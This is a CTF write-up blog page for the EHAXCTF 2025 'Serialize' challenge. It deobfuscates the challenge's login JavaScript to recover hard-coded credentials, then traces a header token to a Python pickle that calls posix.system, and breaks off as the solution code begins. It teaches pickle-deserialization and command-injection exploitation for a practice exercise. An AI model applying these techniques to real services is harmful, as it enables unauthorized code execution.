<!doctype html><html lang=en-us><head><link rel=preload href=/lib/font-awesome/webfonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin=anonymous><link rel=preload href=/lib/font-awesome/webfonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin=anonymous><link rel=preload href=/lib/font-awesome/webfonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin=anonymous><link rel=preload href=/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2 as=font type=font/woff2 crossorigin=anonymous><script type=text/javascript src=../../static/js/cactus.js></script><link rel=stylesheet href=../../static/css/style.css type=text/css><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><title>EHAXCTF 2025 | jsn></title>
<link rel=canonical href=https://jsnv.dev/posts/ctf_ehaxctf_2025/><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="all,follow"><meta name=googlebot content="index,follow,snippet,archive"><meta property="og:url" content="https://jsnv.dev/posts/ctf_ehaxctf_2025/"><meta property="og:site_name" content="jsn>"><meta property="og:title" content="EHAXCTF 2025"><meta property="og:description" content='Serialize Challenge Walkthrough Challenge The challenge tests the following skills:
JavaScript deobfuscation and analysis Python pickle deserialization exploitation Command injection techniques Data exfiltration methods Required background knowledge includes:
JavaScript debugging Python pickle serialization Command injection techniques Web request manipulation Initial Analysis The challenge presents a login page with client-side JavaScript validation. Inspection of the source code reveals heavily obfuscated JavaScript:
1 2 3 4 5 6 7 8 9 <body> <form class="login-form"> <h2>Login to get flag</h2> <input type="text" id="username" placeholder="Enter your username" required> <input type="password" id="password" placeholder="Enter your password" required> <button type="submit">Login</button> </form> <script>[][(![]+[])[+[]]... redacted The full HTML source code is available in this gist'><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-02-18T00:00:00+00:00"><meta property="article:modified_time" content="2025-02-18T00:00:00+00:00"><meta property="article:tag" content="Ctf"><meta property="article:tag" content="Learning"><meta name=twitter:card content="summary"><meta name=twitter:title content="EHAXCTF 2025"><meta name=twitter:description content='Serialize Challenge Walkthrough Challenge The challenge tests the following skills:
JavaScript deobfuscation and analysis Python pickle deserialization exploitation Command injection techniques Data exfiltration methods Required background knowledge includes:
JavaScript debugging Python pickle serialization Command injection techniques Web request manipulation Initial Analysis The challenge presents a login page with client-side JavaScript validation. Inspection of the source code reveals heavily obfuscated JavaScript:
1 2 3 4 5 6 7 8 9 <body> <form class="login-form"> <h2>Login to get flag</h2> <input type="text" id="username" placeholder="Enter your username" required> <input type="password" id="password" placeholder="Enter your password" required> <button type="submit">Login</button> </form> <script>[][(![]+[])[+[]]... redacted The full HTML source code is available in this gist'><link rel=stylesheet href=https://jsnv.dev/css/styles.03006ec6bd28edd6fd47640e057771bc7fe8100f829b99b07506fa24291ebd87618dda2403ca817828eb3ca5c579298ec3cbb356fff5aa8d0309ab747b566ad2.css integrity="sha512-AwBuxr0o7db9R2QOBXdxvH/oEA+Cm5mwdQb6JCkevYdhjdokA8qBeCjrPKXFeSmOw8uzVv/1qo0DCat0e1Zq0g=="><!--[if lt IE 9]><script src=https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js></script><script src=https://oss.maxcdn.com/respond/1.4.2/respond.min.js></script><![endif]--><link rel=icon type=image/png href=https://jsnv.dev/images/favicon.ico></head><body class="max-width mx-auto px3 ltr"><div class="content index py4"><div id=header-post><a id=menu-icon href=#><i class="fas fa-bars fa-lg"></i></a>
<a id=menu-icon-tablet href=#><i class="fas fa-bars fa-lg"></i></a>
<a id=top-icon-tablet href=# onclick='$("html, body").animate({scrollTop:0},"fast")' style=display:none aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
<span id=menu><span id=nav><ul><li><a href=/>~/</a></li><li><a href=/posts>~/posts</a></li><li><a href=/about>~/about</a></li><li><a href=/work>~/work</a></li></ul></span><br><span id=actions><ul><li><a class=icon href=https://jsnv.dev/posts/ctf_broncoctf_2025/ aria-label=Previous><i class="fas fa-chevron-left" aria-hidden=true onmouseover='$("#i-prev").toggle()' onmouseout='$("#i-prev").toggle()'></i></a></li><li><a class=icon href=# onclick='$("html, body").animate({scrollTop:0},"fast")' aria-label="Top of Page"><i class="fas fa-chevron-up" aria-hidden=true onmouseover='$("#i-top").toggle()' onmouseout='$("#i-top").toggle()'></i></a></li><li><a class=icon href=# aria-label=Share><i class="fas fa-share-alt" aria-hidden=true onmouseover='$("#i-share").toggle()' onmouseout='$("#i-share").toggle()' onclick='return $("#share").toggle(),!1'></i></a></li></ul><span id=i-prev class=info style=display:none>Previous post</span>
<span id=i-next class=info style=display:none>Next post</span>
<span id=i-top class=info style=display:none>Back to top</span>
<span id=i-share class=info style=display:none>Share post</span></span><br><div id=share style=display:none><ul><li><a class=icon href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fjsnv.dev%2fposts%2fctf_ehaxctf_2025%2f" aria-label=Facebook><i class="fab fa-facebook" aria-hidden=true></i></a></li><li><a class=icon href="https://twitter.com/share?url=https%3a%2f%2fjsnv.dev%2fposts%2fctf_ehaxctf_2025%2f&text=EHAXCTF%202025" aria-label=Twitter><i class="fab fa-twitter" aria-hidden=true></i></a></li><li><a class=icon href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fjsnv.dev%2fposts%2fctf_ehaxctf_2025%2f&title=EHAXCTF%202025" aria-label=Linkedin><i class="fab fa-linkedin" aria-hidden=true></i></a></li><li><a class=icon href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fjsnv.dev%2fposts%2fctf_ehaxctf_2025%2f&is_video=false&description=EHAXCTF%202025" aria-label=Pinterest><i class="fab fa-pinterest" aria-hidden=true></i></a></li><li><a class=icon href="mailto:?subject=EHAXCTF%202025&body=Check out this article: https%3a%2f%2fjsnv.dev%2fposts%2fctf_ehaxctf_2025%2f" aria-label=Email><i class="fas fa-envelope" aria-hidden=true></i></a></li><li><a class=icon href="https://getpocket.com/save?url=https%3a%2f%2fjsnv.dev%2fposts%2fctf_ehaxctf_2025%2f&title=EHAXCTF%202025" aria-label=Pocket><i class="fab fa-get-pocket" aria-hidden=true></i></a></li><li><a class=icon href="http://reddit.com/submit?url=https%3a%2f%2fjsnv.dev%2fposts%2fctf_ehaxctf_2025%2f&title=EHAXCTF%202025" aria-label=reddit><i class="fab fa-reddit" aria-hidden=true></i></a></li><li><a class=icon href="http://www.tumblr.com/share/link?url=https%3a%2f%2fjsnv.dev%2fposts%2fctf_ehaxctf_2025%2f&name=EHAXCTF%202025&description=%3ch1%20id%3d%22serialize-challenge-walkthrough%22%3eSerialize%20Challenge%20Walkthrough%3c%2fh1%3e%0a%3ch2%20id%3d%22challenge%22%3eChallenge%3c%2fh2%3e%0a%3cp%3e%3cimg%20src%3d%22Pasted%2520image%252020250218144551.png%22%20alt%3d%22Screenshot%20showing%20challenge%20description%22%3e%3c%2fp%3e%0a%3cp%3eThe%20challenge%20tests%20the%20following%20skills%3a%3c%2fp%3e%0a%3cul%3e%0a%3cli%3eJavaScript%20deobfuscation%20and%20analysis%3c%2fli%3e%0a%3cli%3ePython%20pickle%20deserialization%20exploitation%3c%2fli%3e%0a%3cli%3eCommand%20injection%20techniques%3c%2fli%3e%0a%3cli%3eData%20exfiltration%20methods%3c%2fli%3e%0a%3c%2ful%3e%0a%3cp%3eRequired%20background%20knowledge%20includes%3a%3c%2fp%3e%0a%3cul%3e%0a%3cli%3eJavaScript%20debugging%3c%2fli%3e%0a%3cli%3ePython%20pickle%20serialization%3c%2fli%3e%0a%3cli%3eCommand%20injection%20techniques%3c%2fli%3e%0a%3cli%3eWeb%20request%20manipulation%3c%2fli%3e%0a%3c%2ful%3e%0a%3ch2%20id%3d%22initial-analysis%22%3eInitial%20Analysis%3c%2fh2%3e%0a%3cp%3eThe%20challenge%20presents%20a%20login%20page%20with%20client-side%20JavaScript%20validation.%20Inspection%20of%20the%20source%20code%20reveals%20heavily%20obfuscated%20JavaScript%3a%3c%2fp%3e%0a%3cdiv%20class%3d%22highlight%22%3e%3cdiv%20class%3d%22chroma%22%3e%0a%3ctable%20class%3d%22lntable%22%3e%3ctr%3e%3ctd%20class%3d%22lntd%22%3e%0a%3cpre%20tabindex%3d%220%22%20class%3d%22chroma%22%3e%3ccode%3e%3cspan%20class%3d%22lnt%22%3e1%0a%3c%2fspan%3e%3cspan%20class%3d%22lnt%22%3e2%0a%3c%2fspan%3e%3cspan%20class%3d%22lnt%22%3e3%0a%3c%2fspan%3e%3cspan%20class%3d%22lnt%22%3e4%0a%3c%2fspan%3e%3cspan%20class%3d%22lnt%22%3e5%0a%3c%2fspan%3e%3cspan%20class%3d%22lnt%22%3e6%0a%3c%2fspan%3e%3cspan%20class%3d%22lnt%22%3e7%0a%3c%2fspan%3e%3cspan%20class%3d%22lnt%22%3e8%0a%3c%2fspan%3e%3cspan%20class%3d%22lnt%22%3e9%0a%3c%2fspan%3e%3c%2fcode%3e%3c%2fpre%3e%3c%2ftd%3e%0a%3ctd%20class%3d%22lntd%22%3e%0a%3cpre%20tabindex%3d%220%22%20class%3d%22chroma%22%3e%3ccode%20class%3d%22language-html%22%20data-lang%3d%22html%22%3e%3cspan%20class%3d%22line%22%3e%3cspan%20class%3d%22cl%22%3e%3cspan%20class%3d%22p%22%3e%26lt%3b%3c%2fspan%3e%3cspan%20class%3d%22nt%22%3ebody%3c%2fspan%3e%3cspan%20class%3d%22p%22%3e%26gt%3b%3c%2fspan%3e%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20class%3d%22line%22%3e%3cspan%20class%3d%22cl%22%3e%20%20%20%20%3cspan%20class%3d%22p%22%3e%26lt%3b%3c%2fspan%3e%3cspan%20class%3d%22nt%22%3eform%3c%2fspan%3e%20%3cspan%20class%3d%22na%22%3eclass%3c%2fspan%3e%3cspan%20class%3d%22o%22%3e%3d%3c%2fspan%3e%3cspan%20class%3d%22s%22%3e%26%2334%3blogin-form%26%2334%3b%3c%2fspan%3e%3cspan%20class%3d%22p%22%3e%26gt%3b%3c%2fspan%3e%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20class%3d%22line%22%3e%3cspan%20class%3d%22cl%22%3e%20%20%20%20%20%20%20%20%3cspan%20class%3d%22p%22%3e%26lt%3b%3c%2fspan%3e%3cspan%20class%3d%22nt%22%3eh2%3c%2fspan%3e%3cspan%20class%3d%22p%22%3e%26gt%3b%3c%2fspan%3eLogin%20to%20get%20flag%3cspan%20class%3d%22p%22%3e%26lt%3b%2f%3c%2fspan%3e%3cspan%20class%3d%22nt%22%3eh2%3c%2fspan%3e%3cspan%20class%3d%22p%22%3e%26gt%3b%3c%2fspan%3e%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20class%3d%22line%22%3e%3cspan%20class%3d%22cl%22%3e%20%20%20%20%20%20%20%20%3cspan%20class%3d%22p%22%3e%26lt%3b%3c%2fspan%3e%3cspan%20class%3d%22nt%22%3einput%3c%2fspan%3e%20%3cspan%20class%3d%22na%22%3etype%3c%2fspan%3e%3cspan%20class%3d%22o%22%3e%3d%3c%2fspan%3e%3cspan%20class%3d%22s%22%3e%26%2334%3btext%26%2334%3b%3c%2fspan%3e%20%3cspan%20class%3d%22na%22%3eid%3c%2fspan%3e%3cspan%20class%3d%22o%22%3e%3d%3c%2fspan%3e%3cspan%20class%3d%22s%22%3e%26%2334%3busername%26%2334%3b%3c%2fspan%3e%20%3cspan%20class%3d%22na%22%3eplaceholder%3c%2fspan%3e%3cspan%20class%3d%22o%22%3e%3d%3c%2fspan%3e%3cspan%20class%3d%22s%22%3e%26%2334%3bEnter%20your%20username%26%2334%3b%3c%2fspan%3e%20%3cspan%20class%3d%22na%22%3erequired%3c%2fspan%3e%3cspan%20class%3d%22p%22%3e%26gt%3b%3c%2fspan%3e%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20class%3d%22line%22%3e%3cspan%20class%3d%22cl%22%3e%20%20%20%20%20%20%20%20%3cspan%20class%3d%22p%22%3e%26lt%3b%3c%2fspan%3e%3cspan%20class%3d%22nt%22%3einput%3c%2fspan%3e%20%3cspan%20class%3d%22na%22%3etype%3c%2fspan%3e%3cspan%20class%3d%22o%22%3e%3d%3c%2fspan%3e%3cspan%20class%3d%22s%22%3e%26%2334%3bpassword%26%2334%3b%3c%2fspan%3e%20%3cspan%20class%3d%22na%22%3eid%3c%2fspan%3e%3cspan%20class%3d%22o%22%3e%3d%3c%2fspan%3e%3cspan%20class%3d%22s%22%3e%26%2334%3bpassword%26%2334%3b%3c%2fspan%3e%20%3cspan%20class%3d%22na%22%3eplaceholder%3c%2fspan%3e%3cspan%20class%3d%22o%22%3e%3d%3c%2fspan%3e%3cspan%20class%3d%22s%22%3e%26%2334%3bEnter%20your%20password%26%2334%3b%3c%2fspan%3e%20%3cspan%20class%3d%22na%22%3erequired%3c%2fspan%3e%3cspan%20class%3d%22p%22%3e%26gt%3b%3c%2fspan%3e%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20class%3d%22line%22%3e%3cspan%20class%3d%22cl%22%3e%20%20%20%20%20%20%20%20%3cspan%20class%3d%22p%22%3e%26lt%3b%3c%2fspan%3e%3cspan%20class%3d%22nt%22%3ebutton%3c%2fspan%3e%20%3cspan%20class%3d%22na%22%3etype%3c%2fspan%3e%3cspan%20class%3d%22o%22%3e%3d%3c%2fspan%3e%3cspan%20class%3d%22s%22%3e%26%2334%3bsubmit%26%2334%3b%3c%2fspan%3e%3cspan%20class%3d%22p%22%3e%26gt%3b%3c%2fspan%3eLogin%3cspan%20class%3d%22p%22%3e%26lt%3b%2f%3c%2fspan%3e%3cspan%20class%3d%22nt%22%3ebutton%3c%2fspan%3e%3cspan%20class%3d%22p%22%3e%26gt%3b%3c%2fspan%3e%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20class%3d%22line%22%3e%3cspan%20class%3d%22cl%22%3e%20%20%20%20%3cspan%20class%3d%22p%22%3e%26lt%3b%2f%3c%2fspan%3e%3cspan%20class%3d%22nt%22%3eform%3c%2fspan%3e%3cspan%20class%3d%22p%22%3e%26gt%3b%3c%2fspan%3e%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20class%3d%22line%22%3e%3cspan%20class%3d%22cl%22%3e%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20class%3d%22line%22%3e%3cspan%20class%3d%22cl%22%3e%20%20%20%20%3cspan%20class%3d%22p%22%3e%26lt%3b%3c%2fspan%3e%3cspan%20class%3d%22nt%22%3escript%3c%2fspan%3e%3cspan%20class%3d%22p%22%3e%26gt%3b%3c%2fspan%3e%3cspan%20class%3d%22err%22%3e%5b%5d%5b%28%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d...%20redacted%3c%2fspan%3e%0a%3c%2fspan%3e%3c%2fspan%3e%3c%2fcode%3e%3c%2fpre%3e%3c%2ftd%3e%3c%2ftr%3e%3c%2ftable%3e%0a%3c%2fdiv%3e%0a%3c%2fdiv%3e%3cp%3eThe%20full%20HTML%20source%20code%20is%20available%20in%20%3ca%20href%3d%22https%3a%2f%2fgist.github.com%2fjsnv-dev%2ffdf50b45b97ffa8f0083adfda7d11429%22%3ethis%20gist%3c%2fa%3e%3c%2fp%3e" aria-label=Tumblr><i class="fab fa-tumblr" aria-hidden=true></i></a></li><li><a class=icon href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fjsnv.dev%2fposts%2fctf_ehaxctf_2025%2f&t=EHAXCTF%202025" aria-label="Hacker News"><i class="fab fa-hacker-news" aria-hidden=true></i></a></li></ul></div><div id=toc><nav id=TableOfContents><ul><li><a href=#challenge>Challenge</a></li><li><a href=#initial-analysis>Initial Analysis</a></li><li><a href=#technical-deep-dive>Technical Deep Dive</a></li><li><a href=#solution>Solution</a></li><li><a href=#successful-exploitation>Successful Exploitation</a></li><li><a href=#security-implications>Security Implications</a></li><li><a href=#security-recommendations>Security Recommendations</a></li></ul></nav></div></span></div><article class=post itemscope itemtype=http://schema.org/BlogPosting><header><h1 class=posttitle itemprop="name headline">EHAXCTF 2025</h1><div class=meta><div class=postdate><time datetime="2025-02-18 00:00:00 +0000 UTC" itemprop=datePublished>2025-02-18</time></div><div class=article-read-time><i class="far fa-clock"></i>
4 minute read</div><div class=article-category><i class="fas fa-archive"></i>
<a class=category-link href=/categories/ctf>ctf</a></div><div class=article-tag><i class="fas fa-tag"></i>
<a class=tag-link href=/tags/ctf rel=tag>ctf</a>
,
<a class=tag-link href=/tags/learning rel=tag>learning</a></div></div></header><div class=content itemprop=articleBody><h1 id=serialize-challenge-walkthrough>Serialize Challenge Walkthrough</h1><h2 id=challenge>Challenge</h2><p><img src=Pasted%20image%2020250218144551.png alt="Screenshot showing challenge description"></p><p>The challenge tests the following skills:</p><ul><li>JavaScript deobfuscation and analysis</li><li>Python pickle deserialization exploitation</li><li>Command injection techniques</li><li>Data exfiltration methods</li></ul><p>Required background knowledge includes:</p><ul><li>JavaScript debugging</li><li>Python pickle serialization</li><li>Command injection techniques</li><li>Web request manipulation</li></ul><h2 id=initial-analysis>Initial Analysis</h2><p>The challenge presents a login page with client-side JavaScript validation. Inspection of the source code reveals heavily obfuscated JavaScript:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>form</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;login-form&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=p>&lt;</span><span class=nt>h2</span><span class=p>&gt;</span>Login to get flag<span class=p>&lt;/</span><span class=nt>h2</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;text&#34;</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;username&#34;</span> <span class=na>placeholder</span><span class=o>=</span><span class=s>&#34;Enter your username&#34;</span> <span class=na>required</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;password&#34;</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;password&#34;</span> <span class=na>placeholder</span><span class=o>=</span><span class=s>&#34;Enter your password&#34;</span> <span class=na>required</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=p>&lt;</span><span class=nt>button</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;submit&#34;</span><span class=p>&gt;</span>Login<span class=p>&lt;/</span><span class=nt>button</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;/</span><span class=nt>form</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span><span class=err>[][(![]+[])[+[]]... redacted</span>
</span></span></code></pre></td></tr></table></div></div><p>The full HTML source code is available in <a href=https://gist.github.com/jsnv-dev/fdf50b45b97ffa8f0083adfda7d11429>this gist</a></p><p>Browser developer tools debugging reveals an anonymous function containing authentication logic:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kd>function</span> <span class=nx>anonymous</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=s1>&#39;const _0x3645b3=_0x4842;function _0x4842(_0x19d358,_0x49968c){const _0x2ad82b=_0x2ad8();return _0x4842=function(_0x484299,_0x4da982){_0x484299=_0x484299-0x1f1;let _0x4c8636=_0x2ad82b[_0x484299];return _0x4c8636;},_0x4842(_0x19d358,_0x49968c);}(function(_0x4ff4ae,_0x561f72){const _0x2b38fa=_0x4842,_0x2d072e=_0x4ff4ae();while(!![]){try{const _0x20be76=parseInt(_0x2b38fa(0x1f5))/0x1+-parseInt(_0x2b38fa(0x206))/0x2*(parseInt(_0x2b38fa(0x205))/0x3)+parseInt(_0x2b38fa(0x202))/0x4+-parseInt(_0x2b38fa(0x1ff))/0x5+-parseInt(_0x2b38fa(0x1fd))/0x6*(parseInt(_0x2b38fa(0x201))/0x7)+-parseInt(_0x2b38fa(0x1f2))/0x8+parseInt(_0x2b38fa(0x1fa))/0x9*(parseInt(_0x2b38fa(0x1f9))/0xa);if(_0x20be76===_0x561f72)break;else _0x2d072e[\&#39;push\&#39;](_0x2d072e[\&#39;shift\&#39;]());}catch(_0x1a16c9){_0x2d072e[\&#39;push\&#39;](_0x2d072e[\&#39;shift\&#39;]());}}}(_0x2ad8,0xbdbb4));const form=document[_0x3645b3(0x1fe)](_0x3645b3(0x200));async function submitForm(_0x361a11){const _0xbae53f=_0x3645b3,_0x261004=await fetch(_0xbae53f(0x203),{\&#39;method\&#39;:\&#39;POST\&#39;,\&#39;body\&#39;:JSON[_0xbae53f(0x208)](_0x361a11),\&#39;headers\&#39;:{\&#39;Content-Type\&#39;:_0xbae53f(0x1f4)}});window[_0xbae53f(0x1f7)]=\&#39;/welcome.png\&#39;;}form[_0x3645b3(0x1f8)](_0x3645b3(0x1f6),_0x3f6721=&gt;{const _0x43e2d2=_0x3645b3;_0x3f6721[_0x43e2d2(0x1f1)]();const _0x451641=document[_0x43e2d2(0x204)](_0x43e2d2(0x1fc)),_0x12fab0=document[\&#39;getElementById\&#39;](_0x43e2d2(0x207));_0x451641[_0x43e2d2(0x1fb)]==\&#39;dreky\&#39;&amp;&amp;_0x12fab0[\&#39;value\&#39;]==\&#39;ohyeahboiiiahhuhh\&#39;?submitForm({\&#39;user\&#39;:_0x451641[\&#39;value\&#39;],\&#39;pass\&#39;:_0x12fab0[_0x43e2d2(0x1fb)]}):alert(_0x43e2d2(0x1f3));});function _0x2ad8(){const _0x5aa71f=[\&#39;2115056nOLZur\&#39;,\&#39;Invalid\\x20username\\x20or\\x20password\&#39;,\&#39;application/json\&#39;,\&#39;206204rQEQbe\&#39;,\&#39;submit\&#39;,\&#39;location\&#39;,\&#39;addEventListener\&#39;,\&#39;4252550HZZkfV\&#39;,\&#39;18etmbIj\&#39;,\&#39;value\&#39;,\&#39;username\&#39;,\&#39;43194hBWQRV\&#39;,\&#39;querySelector\&#39;,\&#39;5935145KtOSgP\&#39;,\&#39;.login-form\&#39;,\&#39;238aTVShg\&#39;,\&#39;6015272rbWZkU\&#39;,\&#39;/login\&#39;,\&#39;getElementById\&#39;,\&#39;15cVIXSQ\&#39;,\&#39;34886FmgdQH\&#39;,\&#39;password\&#39;,\&#39;stringify\&#39;,\&#39;preventDefault\&#39;];_0x2ad8=function(){return _0x5aa71f;};return _0x2ad8();}&#39;</span>
</span></span></code></pre></td></tr></table></div></div><p>Deobfuscated JavaScript revealing credentials and login endpoint:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kr>const</span> <span class=nx>form</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>querySelector</span><span class=p>(</span><span class=s1>&#39;.login-form&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Main form submission handler
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>form</span><span class=p>.</span><span class=nx>addEventListener</span><span class=p>(</span><span class=s1>&#39;submit&#39;</span><span class=p>,</span> <span class=p>(</span><span class=nx>e</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>e</span><span class=p>.</span><span class=nx>preventDefault</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>username</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;username&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>password</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;password&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Client-side credential check
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span> <span class=p>(</span><span class=nx>username</span><span class=p>.</span><span class=nx>value</span> <span class=o>==</span> <span class=s1>&#39;dreky&#39;</span> <span class=o>&amp;&amp;</span> <span class=nx>password</span><span class=p>.</span><span class=nx>value</span> <span class=o>==</span> <span class=s1>&#39;ohyeahboiiiahhuhh&#39;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>submitForm</span><span class=p>({</span>
</span></span><span class=line><span class=cl>            <span class=s1>&#39;user&#39;</span><span class=o>:</span> <span class=nx>username</span><span class=p>.</span><span class=nx>value</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s1>&#39;pass&#39;</span><span class=o>:</span> <span class=nx>password</span><span class=p>.</span><span class=nx>value</span>
</span></span><span class=line><span class=cl>        <span class=p>});</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>alert</span><span class=p>(</span><span class=s1>&#39;Invalid username or password&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Submit function that sends credentials to server
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kr>async</span> <span class=kd>function</span> <span class=nx>submitForm</span><span class=p>(</span><span class=nx>credentials</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>response</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>fetch</span><span class=p>(</span><span class=s1>&#39;/login&#39;</span><span class=p>,</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;method&#39;</span><span class=o>:</span> <span class=s1>&#39;POST&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;body&#39;</span><span class=o>:</span> <span class=nx>JSON</span><span class=p>.</span><span class=nx>stringify</span><span class=p>(</span><span class=nx>credentials</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;headers&#39;</span><span class=o>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=s1>&#39;Content-Type&#39;</span><span class=o>:</span> <span class=s1>&#39;application/json&#39;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>});</span>
</span></span><span class=line><span class=cl>    <span class=nb>window</span><span class=p>.</span><span class=nx>location</span> <span class=o>=</span> <span class=s1>&#39;/welcome.png&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Discovered credentials:</p><ul><li>Username: <code>dreky</code></li><li>Password: <code>ohyeahboiiiahhuhh</code></li></ul><h2 id=technical-deep-dive>Technical Deep Dive</h2><p>A POST request to the <code>/login</code> endpoint using the discovered credentials yields:</p><p><img src=Pasted%20image%2020250218145247.png alt="Successful login request/response"></p><p>The response redirects to a new page:</p><p><img src=Pasted%20image%2020250218145327.png alt="First flag part reveal"></p><p>Source code reveals a CSS file reference:</p><p><img src=Pasted%20image%2020250218145421.png alt="CSS file reference highlight"></p><p>The CSS file contents expose additional information:</p><p><img src=Pasted%20image%2020250218145502.png alt="CSS file contents showing new endpoint"></p><p>The discovered endpoint <code>/t0p_s3cr3t_p4g3_7_7</code> returns a response with an interesting header:</p><p><img src=Pasted%20image%2020250218145613.png alt="Response with X-Serial-Token header"></p><p>Using CyberChef of the token reveals like a Python pickle serialization. The structure suggests it&rsquo;s trying to call <code>posix.system('dreky')</code>:</p><p><img src=Pasted%20image%2020250218145651.png alt="CyberChef base64 decode output"></p><h2 id=solution>Solution</h2><p>Analysis of the X-Serial-Token reveals Python pickle serialization. Python&rsquo;s pickle module serializes Python objects into a byte stream for storage or transmission. However, pickle deserialization executes code during object reconstruction, making it dangerous when processing untrusted data.</p><p>The original token decoded shows:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
